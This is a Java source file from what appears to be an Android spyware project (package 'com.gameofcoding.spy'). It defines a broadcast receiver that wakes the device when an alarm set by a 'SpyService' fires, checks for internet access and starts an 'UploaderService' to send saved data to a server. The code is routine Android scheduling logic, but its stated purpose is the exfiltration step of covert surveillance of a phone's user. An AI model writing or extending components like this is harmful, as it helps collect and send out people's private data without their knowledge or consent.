package com.gameofcoding.spy.receivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.PowerManager;
import com.gameofcoding.spy.services.UploaderService;
import com.gameofcoding.spy.utils.Utils;
import com.gameofcoding.spy.utils.XLog;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;

/**
 * This alarm is set by the 'SpyService' (after it finishes saving of data).
 *
 * This alarm starts 'UploadeService' for uploading data to server.
 */
public class UploaderAlarmReceiver extends BroadcastReceiver {
    private static final String TAG = "UploaderAlarmReceiver";
    private static final String UPLOADER_ALARM_TAG = "Spy:UploaderAlarm";

    @Override
    public void onReceive(final Context context, final Intent intent) {
	XLog.i(TAG, "Uploader alarm received");
        final PowerManager pm = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
        final PowerManager.WakeLock wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK,
							      UPLOADER_ALARM_TAG);
	final Utils utils = new Utils(context);
        wakeLock.acquire(10000); // Acquire the lock
	
	// check whether the service is already running or not!
	if(new Utils(context).isServiceRunning(UploaderService.class.getName())) {
	    XLog.i(TAG, "UploaderService is already running, abprting...");
	    wakeLock.release(); // Release the lock
	    return;
	}
	
	Future<?> execFuture = Executors.newSingleThreadExecutor()
	    .submit(new Runnable() {
		    @Override
		    public void run() {
			try {
			    if(utils.hasActiveInternetConnection()) {
				Intent serviceIntent = new Intent(context, UploaderService.class);
				utils.startForegroundService(serviceIntent);
				XLog.i(TAG, "UploaderService started");
			    }
			    else { XLog.v(TAG, "No internet available, not starting uploader service."); }
			} catch(Exception e) {
			    XLog.e(TAG, "Exception occured while starting UploaderService", e);
			}
		    }
		});
	try {
	    // Wait until service gets started
	    execFuture.get();
	} catch(Exception e) {
	    XLog.e(TAG, "Exception occurred while waiting for finishing of executor", e);
	} finally {
	    wakeLock.release(); // Release wake lock
	}
    }
}
